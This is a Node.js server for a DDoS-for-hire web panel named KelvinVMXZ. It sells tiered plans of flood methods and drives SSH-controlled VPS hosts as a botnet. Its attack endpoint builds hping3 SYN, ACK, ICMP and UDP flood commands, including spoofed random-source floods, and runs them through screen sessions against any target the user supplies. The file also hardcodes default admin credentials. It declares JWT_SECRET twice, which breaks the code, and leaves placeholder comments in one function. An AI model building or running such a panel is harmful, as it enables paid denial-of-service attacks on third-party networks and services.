const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const { Client } = require('ssh2');
const net = require('net');
// Di bagian atas server.js
const JWT_SECRET = process.env.JWT_SECRET || 'default_fallback_secret_change_in_production';
const axios = require('axios');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'kelvinvmxz_secret_key_change_this_in_production';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Database files
const DB_PATH = path.join(__dirname, 'db');
const USERS_FILE = path.join(DB_PATH, 'users.json');
const VPS_FILE = path.join(DB_PATH, 'vps.json');
const RESELLER_FILE = path.join(DB_PATH, 'reseller.json');
const PREMIUM_FILE = path.join(DB_PATH, 'premium.json');
const PLANS_FILE = path.join(DB_PATH, 'plans.json');
const ATTACKS_FILE = path.join(DB_PATH, 'attacks.json');

// Ensure DB directory exists
if (!fs.existsSync(DB_PATH)) fs.mkdirSync(DB_PATH, { recursive: true });

// Initialize database files
const initDB = () => {
    const defaultAdmin = [{
        id: 1,
        username: 'admin',
        password: bcrypt.hashSync('kelvinvmxz', 10),
        email: 'admin@kelvinvmxz.com',
        role: 'owner',
        createdAt: new Date().toISOString(),
        plan: 'ultimate',
        maxConcurrent: 10,
        maxDuration: 3600,
        methods: ['all']
    }];

    if (!fs.existsSync(USERS_FILE)) {
        fs.writeFileSync(USERS_FILE, JSON.stringify(defaultAdmin, null, 2));
    }
    
    const defaultFiles = [
        { file: VPS_FILE, data: [] },
        { file: RESELLER_FILE, data: [] },
        { file: PREMIUM_FILE, data: [] },
        { file: PLANS_FILE, data: {} },
        { file: ATTACKS_FILE, data: [] }
    ];
    
    defaultFiles.forEach(({ file, data }) => {
        if (!fs.existsSync(file)) {
            fs.writeFileSync(file, JSON.stringify(data, null, 2));
        }
    });
};

initDB();

// Authentication middleware
const authenticate = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }
    
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Invalid token' });
    }
};

// Helper functions
const readJSON = (file) => {
    try {
        return JSON.parse(fs.readFileSync(file, 'utf8'));
    } catch (error) {
        return [];
    }
};

const writeJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Botnet state
let cncActive = false;
let vpsConnections = {};
let ongoingAttacks = [];
const attackHistory = [];
const vpsList = readJSON(VPS_FILE);

// 1. AUTHENTICATION ENDPOINTS
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    const users = readJSON(USERS_FILE);
    const user = users.find(u => u.username === username);
    
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const token = jwt.sign(
        { 
            id: user.id, 
            username: user.username, 
            role: user.role,
            plan: user.plan 
        },
        JWT_SECRET,
        { expiresIn: '24h' }
    );
    
    res.json({ 
        token, 
        user: { 
            id: user.id, 
            username: user.username, 
            role: user.role,
            plan: user.plan,
            maxConcurrent: user.maxConcurrent || 5,
            maxDuration: user.maxDuration || 60
        } 
    });
});

app.post('/api/register', async (req, res) => {
    const { username, password, email, inviteCode } = req.body;
    
    const users = readJSON(USERS_FILE);
    
    if (users.find(u => u.username === username)) {
        return res.status(400).json({ error: 'Username already exists' });
    }
    
    // Default user registration (owner only can create new users through admin panel)
    const newUser = {
        id: users.length + 1,
        username,
        password: await bcrypt.hash(password, 10),
        email,
        role: 'user',
        createdAt: new Date().toISOString(),
        plan: 'free',
        maxConcurrent: 1,
        maxDuration: 30,
        methods: ['syn-pps', 'syn-gbps', 'ack-pps']
    };
    
    users.push(newUser);
    writeJSON(USERS_FILE, users);
    
    res.json({ message: 'User created successfully' });
});

// 2. DASHBOARD ENDPOINTS
app.get('/api/dashboard', authenticate, (req, res) => {
    const users = readJSON(USERS_FILE);
    const vpsList = readJSON(VPS_FILE);
    const activeVPS = Object.keys(vpsConnections).length;
    
    const dashboard = {
        stats: {
            totalUsers: users.length,
            totalVPS: vpsList.length,
            activeVPS: activeVPS,
            ongoingAttacks: ongoingAttacks.length,
            cncStatus: cncActive ? 'active' : 'inactive',
            totalMethods: 18,
            systemUptime: process.uptime()
        },
        user: req.user,
        recentAttacks: attackHistory.slice(-5)
    };
    
    res.json(dashboard);
});

// 3. VPS MANAGEMENT ENDPOINTS
app.get('/api/vps', authenticate, (req, res) => {
    const vpsList = readJSON(VPS_FILE);
    
    // Check VPS status
    const checkVpsStatus = async () => {
        const checkedVPS = await Promise.all(
            vpsList.map(async (vps) => {
                const isOnline = await checkVpsConnection(vps);
                return {
                    ...vps,
                    status: isOnline ? 'online' : 'offline',
                    lastChecked: new Date().toISOString()
                };
            })
        );
        
        // Auto remove offline VPS
        const onlineVPS = checkedVPS.filter(v => v.status === 'online');
        if (onlineVPS.length !== vpsList.length) {
            writeJSON(VPS_FILE, onlineVPS);
        }
        
        return checkedVPS;
    };
    
    checkVpsStatus().then(vps => res.json(vps));
});

app.post('/api/vps', authenticate, async (req, res) => {
    if (req.user.role !== 'owner') {
        return res.status(403).json({ error: 'Only owner can add VPS' });
    }
    
    const { host, username, password } = req.body;
    
    // Test connection before adding
    const testResult = await testVPSConnection({ host, username, password });
    if (!testResult.success) {
        return res.status(400).json({ error: 'VPS connection failed' });
    }
    
    const vpsList = readJSON(VPS_FILE);
    const newVPS = {
        id: vpsList.length + 1,
        host,
        username: username || 'root',
        password,
        addedBy: req.user.username,
        addedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString()
    };
    
    vpsList.push(newVPS);
    writeJSON(VPS_FILE, vpsList);
    
    // Reconnect if CNC is active
    if (cncActive) {
        connectToAllVPS();
    }
    
    res.json({ message: 'VPS added successfully', vps: newVPS });
});

app.delete('/api/vps/:id', authenticate, (req, res) => {
    if (req.user.role !== 'owner') {
        return res.status(403).json({ error: 'Only owner can remove VPS' });
    }
    
    const vpsList = readJSON(VPS_FILE);
    const filtered = vpsList.filter(v => v.id != req.params.id);
    
    if (filtered.length === vpsList.length) {
        return res.status(404).json({ error: 'VPS not found' });
    }
    
    writeJSON(VPS_FILE, filtered);
    
    // Disconnect from VPS if active
    const removedVPS = vpsList.find(v => v.id == req.params.id);
    if (removedVPS && vpsConnections[removedVPS.host]) {
        vpsConnections[removedVPS.host].end();
        delete vpsConnections[removedVPS.host];
    }
    
    res.json({ message: 'VPS removed successfully' });
});

// 4. ATTACK ENDPOINTS
app.post('/api/attack', authenticate, async (req, res) => {
    const { target, port, method, duration } = req.body;
    const user = req.user;
    
    // Check user limits
    if (ongoingAttacks.filter(a => a.userId === user.id).length >= (user.maxConcurrent || 5)) {
        return res.status(400).json({ error: 'Max concurrent attacks reached' });
    }
    
    if (duration > (user.maxDuration || 60)) {
        return res.status(400).json({ error: 'Duration exceeds limit' });
    }
    
    // Check if method is allowed
    if (!user.methods?.includes('all') && !user.methods?.includes(method)) {
        return res.status(403).json({ error: 'Method not allowed for your plan' });
    }
    
    // Generate command
    const command = generateHPing3Command(target, port, method, duration);
    
    // Execute attack
    const attackId = Date.now().toString();
    const attack = {
        id: attackId,
        userId: user.id,
        username: user.username,
        target: `${target}:${port}`,
        method,
        duration,
        startTime: new Date().toISOString(),
        status: 'starting',
        command
    };
    
    ongoingAttacks.push(attack);
    
    // Execute on all VPS
    const results = await executeAttackOnVPS(command);
    
    attack.status = 'running';
    attack.results = results;
    
    // Schedule auto-stop
    setTimeout(() => {
        stopAttack(attackId);
    }, duration * 1000);
    
    res.json({ 
        message: 'Attack launched', 
        attackId,
        results: {
            totalVPS: results.length,
            successful: results.filter(r => r.success).length,
            failed: results.filter(r => !r.success).length
        }
    });
});

app.get('/api/attacks', authenticate, (req, res) => {
    const user = req.user;
    
    let attacks = ongoingAttacks;
    if (user.role !== 'owner') {
        attacks = attacks.filter(a => a.userId === user.id);
    }
    
    res.json({
        ongoing: attacks,
        history: attackHistory.slice(-20)
    });
});

app.post('/api/attack/stop/:id', authenticate, (req, res) => {
    const attackId = req.params.id;
    const user = req.user;
    
    const attack = ongoingAttacks.find(a => a.id === attackId);
    if (!attack) {
        return res.status(404).json({ error: 'Attack not found' });
    }
    
    if (user.role !== 'owner' && attack.userId !== user.id) {
        return res.status(403).json({ error: 'Cannot stop other users attacks' });
    }
    
    stopAttack(attackId);
    res.json({ message: 'Attack stopped' });
});

app.post('/api/attack/stop-all', authenticate, (req, res) => {
    if (req.user.role !== 'owner') {
        return res.status(403).json({ error: 'Only owner can stop all attacks' });
    }
    
    ongoingAttacks.forEach(attack => {
        stopAttack(attack.id);
    });
    
    res.json({ message: 'All attacks stopped' });
});

// 5. CNC CONTROL ENDPOINTS
app.post('/api/cnc/start', authenticate, (req, res) => {
    if (req.user.role !== 'owner') {
        return res.status(403).json({ error: 'Only owner can control CNC' });
    }
    
    cncActive = true;
    connectToAllVPS();
    
    res.json({ 
        message: 'CNC started', 
        status: 'active',
        connectedVPS: Object.keys(vpsConnections).length
    });
});

app.post('/api/cnc/stop', authenticate, (req, res) => {
    if (req.user.role !== 'owner') {
        return res.status(403).json({ error: 'Only owner can control CNC' });
    }
    
    cncActive = false;
    disconnectAllVPS();
    
    res.json({ message: 'CNC stopped', status: 'inactive' });
});

app.get('/api/cnc/status', authenticate, (req, res) => {
    res.json({
        active: cncActive,
        connectedVPS: Object.keys(vpsConnections).length,
        totalVPS: readJSON(VPS_FILE).length
    });
});

// 6. CHECK HOST ENDPOINT
app.post('/api/check-host', authenticate, async (req, res) => {
    const { ip, port = 80, type = 'tcp' } = req.body;
    
    try {
        const result = await checkHostReal(ip, port, type);
        res.json(JSON.parse(result));
    } catch (error) {
        res.status(500).json({ error: 'Check failed', details: error.message });
    }
});

// 7. USER MANAGEMENT ENDPOINTS (Owner only)
app.get('/api/users', authenticate, (req, res) => {
    if (req.user.role !== 'owner') {
        return res.status(403).json({ error: 'Only owner can view users' });
    }
    
    const users = readJSON(USERS_FILE);
    res.json(users.map(u => ({
        id: u.id,
        username: u.username,
        email: u.email,
        role: u.role,
        plan: u.plan,
        maxConcurrent: u.maxConcurrent,
        maxDuration: u.maxDuration,
        createdAt: u.createdAt,
        lastLogin: u.lastLogin
    })));
});

app.post('/api/users', authenticate, async (req, res) => {
    if (req.user.role !== 'owner') {
        return res.status(403).json({ error: 'Only owner can create users' });
    }
    
    const { username, password, email, plan = 'free', maxConcurrent = 1, maxDuration = 30 } = req.body;
    
    const users = readJSON(USERS_FILE);
    
    if (users.find(u => u.username === username)) {
        return res.status(400).json({ error: 'Username already exists' });
    }
    
    const newUser = {
        id: users.length + 1,
        username,
        password: await bcrypt.hash(password, 10),
        email,
        role: 'user',
        plan,
        maxConcurrent,
        maxDuration,
        methods: getMethodsForPlan(plan),
        createdAt: new Date().toISOString()
    };
    
    users.push(newUser);
    writeJSON(USERS_FILE, users);
    
    res.json({ message: 'User created successfully', userId: newUser.id });
});

// Helper Functions
async function checkVpsConnection(vps) {
    return new Promise((resolve) => {
        const conn = new Client();
        conn.on('ready', () => {
            conn.end();
            resolve(true);
        })
        .on('error', () => {
            resolve(false);
        })
        .connect({
            host: vps.host,
            username: vps.username,
            password: vps.password,
            readyTimeout: 5000
        });
    });
}

async function testVPSConnection(vps) {
    return new Promise((resolve) => {
        const conn = new Client();
        conn.on('ready', () => {
            conn.end();
            resolve({ success: true, message: 'Connection successful' });
        })
        .on('error', (err) => {
            resolve({ success: false, message: err.message });
        })
        .connect({
            host: vps.host,
            username: vps.username,
            password: vps.password,
            readyTimeout: 10000
        });
    });
}

function connectToAllVPS() {
    if (!cncActive) return;
    
    const vpsList = readJSON(VPS_FILE);
    
    vpsList.forEach((vps) => {
        if (vpsConnections[vps.host]) {
            try {
                vpsConnections[vps.host].end();
            } catch (e) {}
            delete vpsConnections[vps.host];
        }
        
        const conn = new Client();
        conn.on('ready', () => {
            if (!cncActive) return conn.end();
            vpsConnections[vps.host] = conn;
            
            conn.on('close', () => {
                delete vpsConnections[vps.host];
                if (cncActive) setTimeout(() => connectToAllVPS(), 10000);
            });
        });
        
        conn.on('error', (err) => {
            console.log(`VPS Error: ${vps.host}: ${err.message}`);
            delete vpsConnections[vps.host];
        });
        
        conn.connect({
            host: vps.host,
            username: vps.username || "root",
            password: vps.password,
            readyTimeout: 10000,
            keepaliveInterval: 30000
        });
    });
}

function disconnectAllVPS() {
    cncActive = false;
    for (const host in vpsConnections) {
        vpsConnections[host].end();
        delete vpsConnections[host];
    }
}

async function executeAttackOnVPS(command) {
    const vpsList = readJSON(VPS_FILE);
    const results = [];
    
    for (const vps of vpsList) {
        try {
            const result = await executeOnVPS(vps, command);
            results.push({
                host: vps.host,
                success: result.success,
                message: result.success ? 'Attack launched' : 'Failed'
            });
        } catch (error) {
            results.push({
                host: vps.host,
                success: false,
                message: error.message
            });
        }
    }
    
    return results;
}

async function executeOnVPS(vps, command) {
    return new Promise((resolve) => {
        if (!cncActive || !vpsConnections[vps.host]) {
            return resolve({ vps, success: false });
        }
        
        const safeCommand = command.replace(/'/g, "'\"'\"'");
        const screenName = `attack_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        vpsConnections[vps.host].exec(
            `screen -dmS ${screenName} bash -c "${safeCommand}; sleep 1"`,
            (err) => {
                if (err) {
                    return resolve({ vps, success: false });
                }
                resolve({ vps, success: true });
            }
        );
    });
}

function stopAttack(attackId) {
    const attackIndex = ongoingAttacks.findIndex(a => a.id === attackId);
    if (attackIndex === -1) return;
    
    const attack = ongoingAttacks[attackIndex];
    attack.status = 'stopped';
    attack.endTime = new Date().toISOString();
    
    // Stop on all VPS
    for (const host in vpsConnections) {
        const conn = vpsConnections[host];
        if (conn && typeof conn.exec === 'function') {
            conn.exec('pkill -9 hping3 && screen -ls | grep attack_ | cut -d. -f1 | xargs -I {} screen -X -S {} quit');
        }
    }
    
    attackHistory.push(attack);
    ongoingAttacks.splice(attackIndex, 1);
}

function generateHPing3Command(target, port, method, duration) {
    const baseCmd = `sudo timeout ${duration}s hping3`;
    
    const methods = {
        // Basic Methods
        'syn-pps': `-S --flood -p ${port} ${target}`,
        'syn-gbps': `-S --flood --data 65495 -p ${port} ${target}`,
        'ack-pps': `-A --flood -p ${port} ${target}`,
        'ack-gbps': `-A --flood --data 65495 -p ${port} ${target}`,
        'icmp-pps': `--icmp --flood ${target}`,
        'icmp-gbps': `--icmp --flood --data 65495 ${target}`,
        
        // Advanced Methods
        'rand-udp': `--udp --flood --rand-source -p ${port} ${target}`,
        'rand-syn': `-S --flood --rand-source -p ${port} ${target}`,
        'rand-ack': `-A --flood --rand-source -p ${port} ${target}`,
        'rand-frpu': `-F -P -U --flood --rand-source -p ${port} ${target}`,
        'icmp-ts': `--icmp --icmp-ts --flood ${target}`,
        'rand-icmp': `--icmp --flood --rand-source ${target}`,
        'udp-multi': `--udp --flood -p ${port} --data 1400 ${target}`,
        'udp-sip': `--udp --flood -p 5060 --data 1024 ${target}`,
        'syn-rand': `-S --flood --rand-source -p ${port} --data 1024 ${target}`,
        'ack-rmac': `-A --flood -p ${port} --spoof ${target}`,
        'syn-multi': `-S --flood -p ${port} --data 2048 ${target}`,
        'icmp-rand': `--icmp --flood --rand-source --data 1024 ${target}`,
        'ack-rand': `-A --flood --rand-source -p ${port} --data 1024 ${target}`,
        'oblivion': `-S -A --flood --data 65495 -p ${port} ${target}`
    };
    
    return `${baseCmd} ${methods[method] || methods['syn-pps']}`;
}

function getMethodsForPlan(plan) {
    const plans = {
        'free': ['syn-pps', 'syn-gbps', 'ack-pps'],
        'basic': ['syn-pps', 'syn-gbps', 'ack-pps', 'ack-gbps', 'icmp-pps'],
        'premium': ['syn-pps', 'syn-gbps', 'ack-pps', 'ack-gbps', 'icmp-pps', 'icmp-gbps', 'rand-udp', 'rand-syn'],
        'ultimate': ['all']
    };
    
    return plans[plan] || plans.free;
}

async function checkHostReal(ip, port, mode = 'tcp') {
    // Same check-host.net implementation as your original code
    // [Copy the full checkHostReal function from your original code here]
    // (It's too long to duplicate, but use your existing implementation)
    
    try {
        const response = await axios.get(`https://check-host.net/check-${mode}?host=${ip}:${port}&max_nodes=5`, {
            headers: {
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        // Process response as in your original code
        return JSON.stringify(response.data, null, 2);
    } catch (error) {
        return JSON.stringify({ error: error.message });
    }
}

// Start server
app.listen(PORT, () => {
    console.log(`KelvinVMXZ Web Panel running on port ${PORT}`);
    console.log(`Default admin: admin / kelvinvmxz`);
    console.log(`Dashboard: http://localhost:${PORT}`);
});
